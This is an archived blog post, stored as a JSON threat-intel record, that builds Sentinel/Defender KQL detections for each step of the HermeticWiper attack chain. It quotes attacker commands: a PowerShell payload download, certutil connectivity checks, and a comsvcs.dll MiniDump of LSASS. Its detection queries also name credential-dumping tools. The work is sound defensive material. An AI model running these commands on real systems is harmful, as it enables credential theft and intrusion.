{
    "id": "13869fc7-ca6b-4807-95f2-1e84b4fff213",
    "created_at": "2023-01-12T15:04:23.897812Z",
    "updated_at": "2025-03-27T02:06:14.560453Z",
    "deleted_at": null,
    "sha1_hash": "a7ee8761cb8c2a78cca8deba616c74177c7d156f",
    "title": "2022-02-28 - Detecting malware kill chains with Defender and Microsoft Sentinel",
    "authors": "",
    "file_creation_date": "2022-05-28T16:48:58Z",
    "file_modification_date": "2022-05-28T16:48:58Z",
    "file_size": 612800,
    "plain_text": "# Detecting malware kill chains with Defender and Microsoft Sentinel\n\n**[learnsentinel.blog/2022/02/28/detecting-malware-kill-chains-with-defender-and-microsoft-sentinel/](https://learnsentinel.blog/2022/02/28/detecting-malware-kill-chains-with-defender-and-microsoft-sentinel/)**\n\nmzorich 28th Feb 2022\n\nThe InfoSec community is amazing at providing insight into ransomware and malware attacks. There are so many\nfantastic contributors who share indicators of compromise (IOCs) and all kinds of other data. Community members\nand vendors publish detailed articles on various attacks that have occurred.\n\nUsually these reports contain two different things. Indicators of compromise (IOCs) and tactics, techniques and\nprocedures (TTPs). What is the difference?\n\nIndicators of compromise – are some kind of evidence that an attack has occurred. This could be a malicious\nIP address or domain. It could be hashes of files. These indicators are often shared throughout the\ncommunity. You can hunt for IOCs on places like Virus Total.\nTactics, techniques and procedures – describe the behaviour of how an attack occurred. These read more like\na story of the attack. They are the ‘why’, the ‘what’ and the ‘how’ of an attack. Initial access was via phishing.\nThen reconnaissance. Then execution was via exploiting a scheduled task on a machine. These are also\nknown as attack or kill chains. The idea being if you detected the attack earlier in the chain, the damage could\nhave been prevented.\n\nUsing a threat intelligence source which provides IOCs is a key part to sound defence. If you detect known\nmalicious files or domains in your environment then you need to react. There is, however, a delay between an\nattack occurring and these IOCs being available. Due to privacy, or legal requirements or dozens of other reasons,\nsome IOCs may never be public. Also they can change. New malicious domains or IPs can come online. File\nhashes can change. That doesn’t make IOCs any less valuable. IOCs are still crucial and important in detection.\n\nWe just need to pair our IOC detection with TTP/kill chain detection to increase our defence. These kind of\ndetections look for behaviour rather than specific IOCs. We want to try and detect suspicious activities, so that we\ncan be alerted on potential attacks with no known IOCs. Hopefully these detections also occur earlier in the attack\ntimeline and we are alerted before damage is done.\n\nIf we take for example the Trojan.Killdisk / HermeticWiper malware that has recently been documented. There are a\n[couple of great write ups about the attack timeline. Symantec released this post which provides great insight. And](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia)\n[Senior Microsoft Security Researcher Thomas Roccia (who you should absolutely follow) put together this really](https://twitter.com/fr0gger_)\nuseful infographic. It visualizes the progression of the attack in a way that is easy to understand and follow. This\nvisualizes both indicators and TTPs.\n\n\n-----\n\n[Click for the original](https://twitter.com/fr0gger_/status/1497121876870832128/photo/1)\n\nThis article won’t focus on IOC detection, there are so many great resources for that. Instead we will work through\nthe infographic and Symantec attack chain post. For each step in the chain, we will try to come up with a\nbehavioural detection. Not one that focuses on any specific IOC, but to catch the activity itself. Using event logs and\ndata taken from Microsoft Defender for Endpoint, we can generate some valuable alert rules.\n\nFrom Thomas’ infographic we can see some early reconnaissance and defence evasion.\n\nThe attacker enumerated which privileges the account had. We can find these events with.\n```\nDeviceProcessEvents\n| where FileName == \"whoami.exe\" and ProcessCommandLine contains \"priv\"\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, FileName, InitiatingProcessCommandLine,\nProcessCommandLine\n\n```\nWe get a hit for someone looking at the privilege of the logged on account. This activity should not be occurring\noften in your environment outside of security staff.\n\n\n-----\n\nThe attacker then disabled the volume shadow copy service (VSS), to prevent restoration. When services are\ndisabled they trigger Event ID 7040 in your system logs.\n```\nEvent\n| where EventID == \"7040\"\n| extend Logs=parse_xml(EventData)\n| extend ServiceName =\ntostring(parse_json(tostring(parse_json(tostring(parse_json(tostring(Logs.DataItem)).EventData)).Data))\n[0].[\"#text\"])\n| extend ServiceStatus =\ntostring(parse_json(tostring(parse_json(tostring(parse_json(tostring(Logs.DataItem)).EventData)).Data))\n[2].[\"#text\"])\n| where ServiceName == \"Volume Shadow Copy\" and ServiceStatus == \"disabled\"\n| project TimeGenerated, Computer, ServiceName, ServiceStatus, UserName, RenderedDescription\n\n```\nThis query searches for the specific service disabled in this case. You could easily exclude the ‘ServiceName ==\n“Volume Shadow Copy”‘ section. This would return you all services disabled. This may be an unusual event in your\nenvironment you wish to know about.\n\nIf we switch over to the Symantec article we can continue the timeline. So post compromise of a vulnerable\nExchange server, the first activity noted is.\n\nThe decoded PowerShell was used to download a JPEG file from an internal server, on the victim’s network.\n\n_cmd.exe /Q /c powershell -c “(New-Object_\n_System.Net.WebClient).DownloadFile(‘hxxp://192.168.3.13/email.jpeg’,’CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1′)”_\n_1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1_\n\nThe article states they have decoded the PowerShell to make it readable for us. Which means it was encoded\nduring the attack. Maybe our first rule could be searching for PowerShell that has been encoded? We can achieve\nthat. Start with a broad query. Look for PowerShell and anything with an -enc or -encodedcommand switch.\n```\nDeviceProcessEvents\n| where ProcessCommandLine contains \"powershell\" or InitiatingProcessCommandLine contains \"powershell\"\n| where ProcessCommandLine contains \"-enc\" or ProcessCommandLine contains \"-encodedcommand\" or\nInitiatingProcessCommandLine contains \"-enc\" or InitiatingProcessCommandLine contains \"-encodedcommand\"\n\n```\nIf you wanted to use some more advanced operators, we could extract the encoded string. Then attempt to decode\nit within our query. Query modified from this [post.](https://techcommunity.microsoft.com/t5/microsoft-sentinel/finding-base64-encoded-commands/m-p/1891876)\n```\nDeviceProcessEvents\n| where ProcessCommandLine contains \"powershell\" or InitiatingProcessCommandLine contains \"powershell\"\n| where ProcessCommandLine contains \"-enc\" or ProcessCommandLine contains \"-encodedcommand\" or\nInitiatingProcessCommandLine contains \"-enc\" or InitiatingProcessCommandLine contains \"-encodedcommand\"\n| extend EncodedCommand = extract(@'\\s+([A-Za-z0-9+/]{20}\\S+$)', 1, ProcessCommandLine)\n| where EncodedCommand != \"\"\n| extend DecodedCommand = base64_decode_tostring(EncodedCommand)\n| where DecodedCommand != \"\"\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine,\nProcessCommandLine, EncodedCommand, DecodedCommand\n\n```\n\n-----\n\nWe can see a result where I encoded a PowerShell command to create a local account on this device.\n\nWe use regex to extract the encoded string. Then we use the base64_decode_tostring operator to decode it for us.\nThis second query only returns results when the string can be decoded. So have a look at both queries and see the\nresults in your environment.\n\nThis is a great example of hunting IOCs vs TTPs. We aren’t hunting for specific PowerShell commands. We are\nhunting for the behaviour of encoded PowerShell.\n\nThe next step was –\n\nA minute later, the attackers created a scheduled task to execute a suspicious ‘postgresql.exe’ file, weekly on\na Wednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task.\n\n_cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1_\n_CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1_\n\n_schtasks /run /tn “\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess”_\n\nAttackers may lack privilege to launch an executable under system. They may have privilege to update or create a\nscheduled task running under a different user context. They could change it from a non malicious to malicious\nexecutable. In this example they have created a scheduled task with a malicious executable. Scheduled task\ncreation is a specific event in Defender, so we can track those. We can also track changes and deletions of\nscheduled tasks.\n```\nDeviceEvents\n| where TimeGenerated > ago(1h)\n| where ActionType == \"ScheduledTaskCreated\"\n| extend ScheduledTaskName = tostring(AdditionalFields.TaskName)\n| project TimeGenerated, DeviceName, ScheduledTaskName, InitiatingProcessAccountName\n\n```\nThere is a good chance you get significant false positives with this query. If you read on we will try to tackle that at\nthe end.\n\nFollowing from the scheduled task creation and execution, Symantec notes that next –\n\nBeginning on February 22, Symantec observed the file ‘postgresql.exe’ being executed and used to perform\nthe following\n\n_Execute certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com_\n\n_Execute a PowerShell command to download another JPEG file from a compromised web server –_\n_confluence[.]novus[.]ua_\n\nSo the attackers leveraged certutil.exe to check internet connectivity. Certutil can be used to do this, and even\ndownload files. We can use our DeviceNetworkEvents table to find this kind of event.\n\n\n-----\n\n```\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine,\nLocalIPType,LocalIP, RemoteIPType, RemoteIP, RemoteUrl, RemotePort\n| where InitiatingProcessCommandLine contains \"certutil\"\n| where RemoteIPType == \"Public\"\n\n```\nWe search for DeviceNetworkEvents where the initiating process command line includes certutil. We can also filter\non only connections where the Remote IP is public if you have legitimate internal use.\n\nWe can see where I used certutil to download GhostPack from GitHub. I even attempted to obfuscate the command\nline, but we still found it. This is another great example of searching for TTPs. We don’t hunt for certutil.exe\nconnecting to a specific IOC, but anytime it connects to the internet.\n\nThe next activity was credential dumping –\n\nFollowing this activity, PowerShell was used to dump credentials from the compromised machine\n\n_cmd.exe /Q /c powershell -c “rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600_\n_C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full” 1>_\n\n[There are many ways to dump credentials from a machine, many are outlined here. We can detect on procdump](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)\nusage or comsvcs.dll exploitation. For comsvcs –\n```\nDeviceProcessEvents\n| where InitiatingProcessCommandLine has_all (\"rundll32\",\"comsvcs.dll\",\"minidump\")\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine\n\n```\nAnd for procdump –\n```\nDeviceProcessEvents\n| where InitiatingProcessCommandLine has_all (\"procdump\",\"lsass.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine\n\n```\nThese are definitely offensive commands and shouldn’t be used by regular users.\n\nFinally, the article states that some PowerShell scripts were executed.\n\nLater, following the above activity, several unknown PowerShell scripts were executed.\n\n_powershell -v 2 -exec bypass -File text.ps1_\n_powershell -exec bypass gp.ps1_\n\n_powershell -exec bypass -File link.ps1_\n\nWe can see as part of the running these scripts, the execution policy was changed. PowerShell execution bypass\nactivity can be found easily enough.\n\n\n-----\n\n```\n| where TimeGenerated > ago(1h)\n| project InitiatingProcessAccountName, InitiatingProcessCommandLine\n| where InitiatingProcessCommandLine has_all (\"powershell\",\"bypass\")\n\n```\nThis is another one that is going to be high volume. Let’s try and tackle that now.\n\nWith any queries that are relying on behaviour there is a chance for false positives. With false positives comes alert\nfatigue. We don’t want a legitimate alert buried in a mountain of noise. Hopefully the above queries don’t have any\nfalse positives in your environment. Unfortunately, that is not likely to be true. The nature of these attack techniques\nis they leverage tools that are used legitimately. We can try to tune these alerts down by whitelisting particular\nservers or commands. We don’t want to whitelist the server that is compromised.\n\nInstead, we could look at adding some more intelligence to our queries. To do that we can try to add a baseline to\nour environment. Then we alert when something new occurs.\n\nWe build these types of queries by using an anti join in KQL. Anti joins can be a little confusing, so let’s try to\nvisualize them from a security point of view.\n\nFirst, think of a regular (or inner) join in KQL. We take two queries or tables and join them together on a field (or\nfields) that exist in both tables. Maybe you have firewall data and Active Directory data. Both have IP address\ninformation so you can join them together. Have a read [here for an introduction to inner joins. We can visualize an](https://learnsentinel.blog/2021/11/25/detecting-multistage-attacks-in-microsoft-sentinel/)\ninner join like this.\n\nSo for a regular (or inner) join, we write two queries, then match them on something that is the same in both. Maybe\nan IP address, or a username. Once we join we can retrieve information back from both tables.\n\n\n-----\n\nWhen we expand on this, we can do anti joins. Let s visualize a leftanti join.\n\nSo we can again write two queries, join them on a matching field. But this time, we only return data from the first\n(left) query. A rightanti join is the opposite.\n\n\n-----\n\nFor rightanti joins we run our two queries. We match on our data. But this time we only return results that exist in\nthe second (or right) query.\n\nWith joins in KQL, you don’t need to join between two different data sets. Which can be confusing to grasp. You can\njoin between the same table, with different query options. So we can query the DeviceEvent table for one set of\ndata. Query the DeviceEvent table again, with different parameters. Then join them in different ways. When joining\nthe same table together I think of it like this –\n\nUse a leftanti join when you want to detect when something stops happening.\nUse a rightanti join when you want to detect when something happens for the first time.\n\nNow let’s see how we apply these joins to our detection rules.\n\nScheduled task creation is a good one to use as an example. Chances are you have legitimate software on your\ndevices that create tasks. We will use our rightanti join to add some intelligence to our query.\n\nLet’s look at the following query.\n\n\n-----\n\n```\n| where TimeGenerated > ago(30d) and TimeGenerated < ago(1h)\n| where ActionType == \"ScheduledTaskCreated\"\n| extend ScheduledTaskName = tostring(AdditionalFields.TaskName)\n| distinct ScheduledTaskName\n| join kind=rightanti\n  (DeviceEvents\n  | where TimeGenerated > ago(1h)\n  | where ActionType == \"ScheduledTaskCreated\"\n  | extend ScheduledTaskName = tostring(AdditionalFields.TaskName)\n  | project TimeGenerated, DeviceName, ScheduledTaskName, InitiatingProcessAccountName)\n  on ScheduledTaskName\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ScheduledTaskName\n\n```\nOur first (or left) query looks at our DeviceEvents. We go back between 30 days ago and one hour ago. From that\ndata, all we care about are the names of all the scheduled tasks that have been created. So we use the distinct\noperator. That first query becomes our baseline for our environment.\n\nNext we select our join type. Kind = rightanti. We join back to the same table, DeviceEvents. This time though, we\nare only interested in the last hour of data. We retrieve the TimeGenerated, DeviceName,\nInitiatingProcessAccountName and ScheduledTaskName.\n\nThen we tell KQL what field we want to join on. We want to join on ScheduledTaskName. Then return only data that\nis new in the last hour.\n\nSo to recap. First find all the scheduled tasks created between 30 days and an hour ago. Then find me all the\nscheduled tasks created in the last hour. Finally, only retrieve tasks that are new to our environment in the last hour.\nThat is how we do a rightanti join.\n\nAnother example is PowerShell commands that change the execution policy to bypass. You probably see plenty of\nthese in your environment\n```\nDeviceProcessEvents\n| where TimeGenerated > ago(30d) and TimeGenerated < ago(1h)\n| project InitiatingProcessAccountName, InitiatingProcessCommandLine\n| where InitiatingProcessCommandLine has_all (\"powershell\",\"bypass\")\n| distinct InitiatingProcessAccountName, InitiatingProcessCommandLine\n| join kind=rightanti (\n  DeviceProcessEvents\n  | where TimeGenerated > ago(1h)\n  | project\n    TimeGenerated,\n    DeviceName,\n    InitiatingProcessAccountName,\n    InitiatingProcessCommandLine\n  | where InitiatingProcessAccountName !in (\"system\",\"local service\",\"network service\")\n  | where InitiatingProcessCommandLine has_all (\"powershell\",\"bypass\")\n  )\n  on InitiatingProcessAccountName, InitiatingProcessCommandLine\n\n```\nThis query is nearly the same as the one previous. We look back between 30 days and one hour. This time we\nquery for commands executed that contain both ‘powershell’ and ‘bypass’. This time we retrieve both distinct\ncommands and the account that executed them.\n\nThen choose our rightanti join again. Run the same query once more for the last hour. We join on both our fields.\nThen return what is new to our environment in the last hour. For this query, the combination of command line and\naccount needs to be unique.\n\nFor this particular example I excluded processes initiated by system, local service or network service. This will find\nevents run under named user accounts only. This is an example though and it is easy enough to include all\ncommands.\n\n\n-----\n\nIn summary.\n\nThese queries aren’t meant to be perfect hunting queries for all malware attack paths. They may definitely\nuseful detections in your environment though. The idea is to try to help you think about TTP detections.\nWhen you read malware and ransomware reports you should look at both IOCs and TTPs.\nDetect on the IOCs. If you use Sentinel you can use Microsoft provided threat intelligence. You can also\n[include your own feeds. Information is available here. There are many ready to go rules to leverage that data](https://docs.microsoft.com/en-us/azure/sentinel/understand-threat-intelligence)\nyou can simply enable.\nFor TTPs, have a read of the report and try to come up with queries that detect that behaviour. Then have a\nlook how common that activity is for you. The example above of using certutil.exe to download files is a good\nexample. That may be extremely rare in your environment. Your hunting query doesn’t need to list the specific\nIOCs to that action. You can just alert any time certutil.exe connects to the internet.\nTools like PowerShell are used both maliciously and legitimately. Try to write queries that detect changes or\nanomalies in those events. Apply your knowledge of your environment to try and filter the noise without\nfiltering out genuine alerts.\nAll the queries in this post that use Device* tables should also work in Advanced Hunting. You will just need to\nchange ‘timegenerated’ to ‘timestamp’.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-28 - Detecting malware kill chains with Defender and Microsoft Sentinel.pdf"
    ],
    "report_names": [
        "2022-02-28 - Detecting malware kill chains with Defender and Microsoft Sentinel.pdf"
    ],
    "threat_actors": [
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535863,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653756538,
    "ts_modification_date": 1653756538,
    "files": {
        "pdf": "https://archive.orkl.eu/a7ee8761cb8c2a78cca8deba616c74177c7d156f.pdf",
        "text": "https://archive.orkl.eu/a7ee8761cb8c2a78cca8deba616c74177c7d156f.txt",
        "img": "https://archive.orkl.eu/a7ee8761cb8c2a78cca8deba616c74177c7d156f.jpg"
    }
}